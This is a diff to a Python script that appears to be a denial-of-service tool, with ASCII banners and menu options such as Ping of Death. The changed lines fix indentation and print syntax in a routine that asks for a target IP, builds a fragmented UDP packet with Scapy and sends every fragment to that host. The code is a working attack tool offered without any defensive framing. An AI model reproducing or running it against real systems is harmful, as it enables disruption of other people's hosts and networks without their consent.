@@ -159,7 +159,7 @@ def main():
         print("/_/     /_____/\____/____/  ")
         Pingofdeath()
     elif option == 6:
-	print("Disclaimer: On Termux this attack doesn't work (unless you are Root)")
+        print("Disclaimer: On Termux this attack doesn't work (unless you are Root)")
         print("because of socket permissions.")   
         time.sleep(5)
         os.system("clear")
@@ -176,18 +176,18 @@ def main():
         print("  / /_____/ / / / __ \\__ \ ")
         print(" / /_____/ /_/ / /_/ /__/ / ")
         print("/_/     /_____/\____/____/  ")
-	dip=str(input("Target IP: "))
+        dip=str(input("Target IP: "))
         payload="A"*496+"B"*500
-	packet=IP(dst=dip,id=12345)/UDP(sport=1500,dport=1501)/payload
+        packet=IP(dst=dip,id=12345)/UDP(sport=1500,dport=1501)/payload
 
         frags=fragment(packet,fragsize=500)
 
         counter=1
-	for fragment in frags:
-		print("Packet Number: "+str(counter))
-		print "==================================================="
-		fragment.show() #displays each fragment
-		counter+=1
-		send(fragment)
+        for fragment in frags:
+            print("Packet Number: "+str(counter))
+            print("===================================================")
+            fragment.show() #displays each fragment
+            counter+=1
+            send(fragment)
 if __name__ == "__main__":
     main()
